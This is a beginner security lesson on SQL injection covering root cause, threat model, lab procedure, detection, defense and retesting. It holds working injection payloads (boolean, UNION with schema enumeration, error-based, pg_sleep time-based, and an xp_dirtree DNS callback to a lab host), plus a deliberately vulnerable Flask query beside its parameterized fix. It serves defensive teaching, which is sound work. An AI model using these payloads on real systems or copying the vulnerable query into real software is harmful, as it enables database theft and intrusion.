---
schema_version: 1
id: WEB-A05-SQL-INJECTION
title: "SQL Injection"
slug: sql-injection
level: beginner
estimated_minutes: 45
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-89
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# SQL Injection

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain SQL Injection by root cause instead of just describing the consequences. 
- Identify the trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploited. 
- Perform the basic UNION SQLi workflow: count columns with `ORDER BY`, find renderable columns, and extract synthetic data with `UNION SELECT`.
- Conduct controlled testing in a local lab and distinguish expected results from false positives. 
- Select root controls, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Grasp the flow of HTTP request/response in the situation of SQL Injection and how to apply input handling across trust boundaries. 
- Distinguish between authentication, authorization, and validation. 
- Be able to read code/configuration in the language or framework appearing in the example. 
- Have an isolated local lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

Imagine a database as a huge information storage warehouse, and SQL is the language used to communicate to request the warehouse keeper to retrieve data for you. In safe conversations, programmers use pre-compiled statements (Prepared Statements) like a form with pre-existing blank fields. When you fill in information in these blank fields, the warehouse keeper only sees it as pure data and never confuses it with action commands. Characters like single quotes `'` or comments `--` in SQL are usually used to demarcate string boundaries and write notes.

```python
import sqlite3

def get_user_by_email(email):
    # Establish connection to the database
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # Normal operation using parameterized query (prepared statement)
    # The database engine compiles the SQL query structure first,
    # then binds the email parameter as a literal value, preventing SQL injection.
    query = "SELECT id, username, email FROM users WHERE email = ?"
    cursor.execute(query, (email,))

    user = cursor.fetchone()
    conn.close()
    return user
```

## 4. Description and Root Cause

The SQL Injection (SQLi) vulnerability occurs when a web application does not use secure input forms but directly concatenates user information into commands sent to the data keeper. This is like writing an extra line of instruction immediately next to your name on a request form. An attacker can insert the keywords SQL or single quotes to break the original command, forcing the database to execute unintended actions. For example, instead of just searching for a product, the command could be changed to "display the passwords of all users." This vulnerability is extremely dangerous because it can lead to the leakage of sensitive information of millions of customers, complete deletion of the database, or even allow an attacker to gain full control over the server.

> **Reference:** technical claims in the lesson are marked with a source; when applying in practice, compare with the version/framework being used: [S1], [S2], [S3], [S4].

## 5. Threat Model and Exploitation Conditions

- **Assets:** the fixture rows and database account privileges.
- **Actor, authentication, and role:** anonymous login/search or user role filtering data.
- **Exploitation conditions:** input concatenated into SQL altering predicate, union, error, or time semantics.
- **Browser, proxy, framework, and version:** PostgreSQL 16 and MySQL 8 fixtures separated with Python 3.12/Flask; loopback; must record actual image/package version along with evidence.
- **Mandatory evidence:** along with correlation ID the input must be concatenated, controlling decisions and impacting the correct asset; individual status codes are not sufficient. [S1]

## 6. Attack Mechanism

For SQL injection, input appended to SQL changes the predicate, union, error, or time semantics. The positive case must demonstrate that the input reaches the correct sink and creates the described effect; the negative case, when the original control is enabled, must be blocked before any side effect. The conclusion only applies to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch PostgreSQL 16 and MySQL 8 fixtures separately with Python 3.12/Flask; loopback; only load synthetic data, enable application/proxy/datastore logging, and attach correlation ID.
2. **Baseline:** send a valid input for the SQL injection use case; save raw request/response, decide policy and asset status before testing.
3. **Input and actions:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and comply with the request cap.
4. **Expected result:** consider a fixture vulnerable as positive only when logs show the mechanism of the “input appended to SQL causing predicate, union, error, or time semantics change”; secure fixture must block before side effect, and boundary input must fail closed.
5. **Cleanup:** delete SQL injection data, markers, and logs; revoke related session/cache, restore snapshot, and confirm no remaining test callbacks/processes.
6. **Safety limits:** run only on loopback/`.lab.test`; do not use real targets, credentials, or data; OOB/DoS/state-changing must comply with network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

Lesson keeps probes representing boolean, UNION, error-based, time-based, and OOB in separate fixtures. Stacked query and deep data reading variants still depend on DBMS/driver/database privileges, so they cannot be inferred from a single probe. [S1]

<!-- payload-id: WEB-A05-SQL-INJECTION-001 -->
<!-- context: PostgreSQL 16 fixture concatenates a string-valued username inside a WHERE predicate -->
<!-- prerequisites: synthetic users only; one baseline and one probe request; response exposes only a public match/no-match marker -->
<!-- encoding: UTF-8 form value percent-encoded once; PostgreSQL receives the decoded quote, spaces and comment marker -->
<!-- expected-result: vulnerable fixture changes from no-match to match; parameterized fixture returns no match and records no SQL syntax error -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-18 -->
```text
' OR '1'='1'--
```

**UNION-based SQLi in a PostgreSQL fixture**

UNION SQLi uses the `UNION` operator to append attacker-controlled query results to the result set of the original query. Beginners should understand this variant because it clearly shows the three core steps: determine column count, find columns that render data, and only then extract synthetic lab data. [S1]

Safe workflow in the fixture:

1. **Count columns:** increase `ORDER BY 1`, `ORDER BY 2`, `ORDER BY 3` until the fixture returns an error or changes its marker. The last valid index is the original query column count.
2. **Find renderable columns:** start with `UNION SELECT NULL,...` to avoid type errors, then replace each `NULL` with a string marker such as `'SQLI_UNION_MARKER'` to identify which column is rendered in the response.
3. **Extract synthetic data:** query only lab-seeded tables, such as `users(username,email)`. PostgreSQL/MySQL/MSSQL can enumerate schema through `information_schema.tables` and `information_schema.columns`; Oracle uses `all_tables` and `all_tab_columns`. [S1]

<!-- payload-id: WEB-A05-SQL-INJECTION-005 -->
<!-- context: PostgreSQL 16 product-search fixture returns three visible columns from a single-quoted WHERE predicate -->
<!-- prerequisites: synthetic products and users tables only; vulnerable fixture renders query rows; one probe per request; parameterized fixture is the negative control -->
<!-- encoding: UTF-8 query value percent-encoded once; PostgreSQL receives decoded quote, UNION keyword, NULL values and comment marker -->
<!-- expected-result: ORDER BY confirms three columns; marker appears only in the selected renderable column; synthetic username/email rows appear only in the vulnerable fixture -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-19 -->
```sql
-- Step 1: count columns. ORDER BY 4 should fail in the three-column fixture.
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -

-- Step 2: find a renderable string column.
' UNION SELECT NULL,'SQLI_UNION_MARKER',NULL-- -

-- Step 3: extract only synthetic lab data.
' UNION SELECT NULL,username,email FROM users-- -

-- Optional schema discovery in PostgreSQL/MySQL/MSSQL lab fixtures.
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,column_name,data_type FROM information_schema.columns WHERE table_name='users'-- -
```

**Error-based SQLi in a MySQL fixture**

<!-- payload-id: WEB-A05-SQL-INJECTION-002 -->
<!-- context: MySQL 8 fixture concatenates a single-quoted product name inside a WHERE predicate -->
<!-- prerequisites: synthetic table only; database errors are exposed only in the vulnerable fixture; one request per payload -->
<!-- encoding: UTF-8 form value percent-encoded once before HTTP transport; MySQL receives decoded quote and function call -->
<!-- expected-result: vulnerable fixture emits a controlled XML/XPath error marker; parameterized fixture returns a generic validation error without DB error text -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-18 -->
```sql
' AND updatexml(1, concat(0x7e, (SELECT 'SQLI_ERROR_LAB'), 0x7e), 1)-- -
```

**Time-based SQLi in a PostgreSQL fixture**

<!-- payload-id: WEB-A05-SQL-INJECTION-003 -->
<!-- context: PostgreSQL 16 fixture concatenates a single-quoted username inside a WHERE predicate -->
<!-- prerequisites: request timeout is capped; baseline latency is recorded; one request only -->
<!-- encoding: UTF-8 form value percent-encoded once; PostgreSQL receives decoded quote and pg_sleep call -->
<!-- expected-result: vulnerable fixture latency increases by the bounded sleep interval; parameterized fixture rejects the payload without delay -->
<!-- risk: dos -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-18 -->
```sql
'; SELECT pg_sleep(2)-- -
```
**OOB SQLi by DNS callback in SQL Server fixture**

<!-- payload-id: WEB-A05-SQL-INJECTION-004 -->
<!-- context: SQL Server 2022 lab fixture allows stacked statements only in the intentionally vulnerable case; DNS callback is loopback-only -->
<!-- prerequisites: callback.lab.test is resolved by the local DNS recorder; outbound Internet is blocked; xp_dirtree is disabled in the secure fixture -->
<!-- encoding: UTF-8 form value percent-encoded once; backslashes reach SQL Server as a UNC path in the vulnerable fixture -->
<!-- expected-result: vulnerable fixture creates one local DNS lookup for SQLI_OOB_004.callback.lab.test; secure fixture blocks stacked execution and callback log remains empty -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-18 -->
```sql
'; EXEC master..xp_dirtree '\\SQLI_OOB_004.callback.lab.test\share'-- -
```

## 9. Vulnerable Code and Secure Code

```python
# === VULNERABLE CODE (Python Flask) ===
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/user')
def get_user_vulnerable():
    username = request.args.get('username')
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    # DANGER: Direct string concatenation leads to Union, Error, Blind, or Stacked SQLi
    query = f"SELECT bio FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return str(cursor.fetchall())

# === SECURE CODE (Python Flask) ===
@app.route('/secure-user')
def get_user_secure():
    username = request.args.get('username')
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    # SECURE: Using placeholder '?' to ensure safe parameter binding
    query = "SELECT bio FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return str(cursor.fetchall())
```

```javascript
// === SECURE CODE (Node.js - pg client) ===
const { Client } = require('pg');

async function getUserSecure(email) {
  const client = new Client();
  await client.connect();
  try {
    // SECURE: Parameterized query using placeholders
    const query = {
      text: 'SELECT name, bio FROM users WHERE email = $1',
      values: [email],
    };
    const res = await client.query(query);
    return res.rows[0];
  } finally {
    await client.end();
  }
}
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to SQL Injection, the policy result, and correlation ID; do not log secrets or full tokens.
- Compare authorization/validation failures with the valid baseline and alert according to the behavior chain, not just one payload chain.
- Combine application telemetry, reverse proxy, and datastore to confirm that the request reached the sink and whether it had any impact.
- Scanner or WAF alert is only an investigation signal; it is not the sole proof that a vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Use prepared statements for values and allowlist identifiers that cannot be bound.
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before any side effect.

### Defense-in-depth

With SQL Injection, the following measures help reduce blast radius or increase detection capability. Rate limit, UUID unpredictability, WAF, CSP, or general validation should not be used as a substitute for original controls.

- **Summary**: Use parameterized query statements (prepared statements), ORM frameworks, and strict input data type checks. 
- **Detailed steps**:
  - Use parameterized queries for all SQL statements to separate the structure of the command and the data.
  - Use ORM libraries (such as SQLAlchemy, Hibernate) because they automatically parameterize queries.
  - Strictly validate input data types (if a number is entered, cast to integer).
  - Limit permissions to the minimum for database accounts connecting from the application.

## 12. Retest

- **Positive case:** with SQL Injection, the valid flow still works correctly for the actor and allowed data.  
- **Negative case:** the same input/resource but with an actor or context not allowed should be denied without leaking sensitive details.  
- **Boundary case:** test empty values, edge cases, different encodings, repeated requests, expired session state, and equivalent paths/operations.  
- **Telemetry:** verify that policy decisions, application logs, proxy logs, and datastore side effects match the correlation ID.  
- **Recheck:** save the minimal scenario that reproduces the old error and prove that the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of SQL Injection without confirming side effects and logs. 
- Use a payload with correct syntax but the wrong DBMS, browser, framework, protocol, or injection context. 
- Consider UUID, rate limit, WAF, CSP, or general input validation as fixed by another original control. 
- Only fix one route while the same sink/policy is used in another route. 
- Conclude that a vulnerability exists without saving the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **SQL (Structured Query Language)**: A structured query language used to interact with databases.
- **SQL Injection**: A vulnerability that allows attackers to insert arbitrary SQL commands to manipulate the database.
- **Prepared Statement**: A technique to precompile SQL statements and pass data as independent arguments to ensure safety.
- **RDBMS**: A relational database management system that stores data in interrelated tables.
- **Database**: A system for centralized data storage of an application.

## 16. Related Lessons and Further Reading

- [Second-Order SQL Injection](../second-order-sqli/) — A second-order SQLi vulnerability occurs when input data is stored in DB before being unsafely queried in another function.
- [NoSQL Injection](../nosql-injection/) — Similar to SQLi but targeting non-relational database management systems like MongoDB.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/sql-injection — version/status: current version; accessed: 2026-07-17.  
- **[S2]** OWASP. https://owasp.org/www-community/attacks/SQL_Injection — version/status: current version; accessed: 2026-07-17.  
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/89.html — version/status: current version; accessed: 2026-07-17.  
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.
